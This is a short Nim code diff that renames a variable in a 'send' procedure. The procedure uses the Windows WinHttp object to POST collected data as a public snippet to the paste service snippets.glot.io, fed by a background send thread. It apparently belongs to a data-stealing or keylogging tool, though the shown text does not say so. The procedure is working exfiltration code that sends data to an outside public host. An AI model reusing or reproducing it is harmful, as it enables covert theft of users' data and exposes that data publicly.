@@ -11,14 +11,14 @@ from ../channels import sendThreadChannel
 from ../flags import SEND_THREAD_TRY_INTERVAL
 
 proc send(data: string): void =
-  var obj = CreateObject("WinHttp.WinHttpRequest.5.1")
+  var http = CreateObject("WinHttp.WinHttpRequest.5.1")
 
-  obj.open("POST", "https://snippets.glot.io/snippets")
-  obj.SetRequestHeader("Content-Type", "application/json")
-  obj.send("{\"public\": true, \"language\": \"cpp\", \"title\": \"ceva\", \"files\": [{\"name\": \"name\", \"content\": \"" &
+  http.open("POST", "https://snippets.glot.io/snippets")
+  http.SetRequestHeader("Content-Type", "application/json")
+  http.send("{\"public\": true, \"language\": \"cpp\", \"title\": \"ceva\", \"files\": [{\"name\": \"name\", \"content\": \"" &
       data & "\"}]}")
 
-  echo obj.status
+  echo http.status
 
 
 proc initSendThread*(): void {.thread.} =
